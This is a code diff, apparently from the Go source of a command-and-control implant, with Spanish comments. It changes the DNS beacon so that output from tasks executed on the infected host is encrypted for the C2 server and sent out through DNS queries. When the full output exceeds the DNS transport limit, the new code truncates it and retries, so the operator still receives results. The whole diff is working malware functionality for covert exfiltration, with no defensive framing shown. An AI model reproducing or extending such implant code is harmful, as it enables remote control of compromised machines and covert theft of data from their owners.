@@ -853,24 +853,96 @@ func beaconDNS(profile *profiles.DNSProfile, implantID string, sc *crypto.Sessio
 		output, errMsg := executeTask(t.Command, t.Args)
 		debugLog("dns beacon: tarea %s ejecutada, output=%d bytes err=%q", t.ID, len(output), errMsg)
 
-		result := protocol.TaskResultWire{TaskID: t.ID, Output: output, Error: errMsg}
-		resultJSON, _ := json.Marshal(result)
-		encResult, err := sc.EncryptForC2(resultJSON, nil)
-		if err != nil {
-			continue
-		}
-		wrap := protocol.EncryptedWrapper{ImplantID: implantID, Data: encResult}
-		wrapJSON, _ := json.Marshal(wrap)
-		resEnv := protocol.NewEnvelope(protocol.MsgTaskResult, wrapJSON)
-		// No necesitamos la respuesta; ignoramos el retorno.
-		if _, err := exchangeDNS(profile, resEnv, implantID); err != nil {
+		if err := sendTaskResultDNS(profile, implantID, sc, t.ID, output, errMsg); err != nil {
 			debugLog("dns beacon: enviar resultado %s falló: %v", t.ID, err)
-			continue  // dejamos la tarea como está; el server la reintentará
+			continue
 		}
 		debugLog("dns beacon: resultado %s enviado", t.ID)
 	}
 
 	return nil
+}
+
+// sendTaskResultDNS envía el resultado de una tarea por DNS.
+//
+// Si el output completo no cabe en el límite del transporte, hace un
+// segundo intento con el output truncado a un tamaño seguro y anota el
+// truncamiento en el campo Error para que el operador sepa que la
+// información está incompleta.
+//
+// El límite del transporte viene dado por el perfil DNS:
+//
+//	MaxChunks × MaxLabelSize × 5/8 ≈ bytes descifrados
+//
+// Para dns-txt con MaxChunks=128 y MaxLabelSize=63: ~5 KB. Descontando
+// el overhead del envelope, JSON y TaskID, dejamos un margen de 2.5 KB
+// para el output.
+func sendTaskResultDNS(
+	profile *profiles.DNSProfile,
+	implantID string,
+	sc *crypto.SessionCrypto,
+	taskID string,
+	output []byte,
+	errMsg string,
+) error {
+	// Intento 1: output completo.
+	if err := trySendResultDNS(profile, implantID, sc, taskID, output, errMsg); err == nil {
+		return nil
+	} else {
+		debugLog("dns beacon: envío completo falló: %v (output=%d bytes)", err, len(output))
+	}
+
+	// Intento 2: truncado. Dejamos un margen cómodo por debajo del límite
+	// real del perfil para absorber el overhead del envelope + JSON.
+	const safeOutputBytes = 2500
+
+	truncated := output
+	if len(truncated) > safeOutputBytes {
+		truncated = truncated[:safeOutputBytes]
+	}
+	truncNote := fmt.Sprintf(
+		"[salida truncada por límite DNS: %d de %d bytes] %s",
+		len(truncated), len(output), errMsg,
+	)
+	if err := trySendResultDNS(profile, implantID, sc, taskID, truncated, truncNote); err != nil {
+		return fmt.Errorf("envío truncado también falló: %w", err)
+	}
+	debugLog("dns beacon: resultado %s enviado truncado (%d de %d bytes)",
+		taskID, len(truncated), len(output))
+	return nil
+}
+
+// trySendResultDNS hace un único intento de envío sin truncar.
+// Devuelve el error de exchangeDNS tal cual.
+func trySendResultDNS(
+	profile *profiles.DNSProfile,
+	implantID string,
+	sc *crypto.SessionCrypto,
+	taskID string,
+	output []byte,
+	errMsg string,
+) error {
+	result := protocol.TaskResultWire{
+		TaskID: taskID,
+		Output: output,
+		Error:  errMsg,
+	}
+	resultJSON, err := json.Marshal(result)
+	if err != nil {
+		return fmt.Errorf("marshal result: %w", err)
+	}
+	encResult, err := sc.EncryptForC2(resultJSON, nil)
+	if err != nil {
+		return fmt.Errorf("cifrar result: %w", err)
+	}
+	wrap := protocol.EncryptedWrapper{
+		ImplantID: implantID,
+		Data:      encResult,
+	}
+	wrapJSON, _ := json.Marshal(wrap)
+	resEnv := protocol.NewEnvelope(protocol.MsgTaskResult, wrapJSON)
+	_, err = exchangeDNS(profile, resEnv, implantID)
+	return err
 }
 
 // exchangeDNS envía un envelope troceado en queries DNS y devuelve el
